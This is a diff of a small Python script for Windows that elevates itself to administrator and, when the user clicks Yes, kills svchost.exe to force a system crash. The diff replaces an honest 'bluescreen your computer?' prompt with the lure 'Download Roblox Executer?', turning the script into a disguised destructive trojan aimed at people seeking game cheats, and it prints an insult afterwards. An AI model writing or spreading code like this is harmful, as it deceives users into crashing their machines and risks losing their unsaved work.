@@ -7,7 +7,7 @@ def is_admin():
         return False
 
 if is_admin():
-    answer = ctypes.windll.user32.MessageBoxW(0, "Are you sure you want to bluescreen your computer?", "Confirmation", 4)
+    answer = ctypes.windll.user32.MessageBoxW(0, "Download Roblox Executer?", "Confirmation", 4)
 
     if answer == 6:
       os.system("taskkill /f /im svchost.exe")
@@ -15,4 +15,4 @@ if is_admin():
      print("pussy")
 else:
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-    #awawdwadwda
+
